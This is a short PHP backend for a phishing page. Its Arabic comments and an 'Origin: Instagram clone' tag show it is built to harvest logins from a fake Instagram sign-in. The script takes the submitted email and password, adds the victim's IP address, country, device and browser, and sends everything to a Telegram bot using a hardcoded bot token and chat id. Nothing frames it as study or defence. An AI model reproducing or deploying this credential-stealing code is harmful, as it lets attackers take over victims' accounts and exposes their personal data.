<?php
// بيانات بوت تيليقرام
$botToken = '7817680644:AAEg8aTs4WtFQ4CkYTuk4rmwNFC3Cz0DizE'
$chatId ='7931625169';

// جلب البيانات من POST
$email = $_POST['email'] ?? 'غير معروف';
$password = $_POST['password'] ?? 'غير معروف';

// جلب IP والبلد
$ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
$country = 'غير معروف';

$ipApi = @file_get_contents("https://ipwhois.app/json/{$ip}");
if ($ipApi !== false) {
  $json = json_decode($ipApi, true);
  if ($json && isset($json['country'])) {
    $country = $json['country'];
  }
}

// جلب معلومات الجهاز والمتصفح
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'غير معروف';
$device = preg_match('/Mobile|Android/i', $userAgent) ? 'Mobile' : 'Desktop';
$time = date("d/m/Y H:i:s");

// إعداد الرسالة
$message = "<b>Login attempt</b>\n";
$message .= "<b>Email:</b> $email\n";
$message .= "<b>Password:</b> $password\n";
$message .= "<b>IP:</b> $ip\n";
$message .= "<b>Country:</b> $country\n";
$message .= "<b>Device:</b> $device\n";
$message .= "<b>Browser:</b> $userAgent\n";
$message .= "<b>Time:</b> $time\n";
$message .= "<b>Origin:</b> Instagram clone";

// إرسال الرسالة لتليقرام
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=HTML");

// إرجاع استجابة فارغة بدون تحويل
http_response_code(200);
exit;
?>
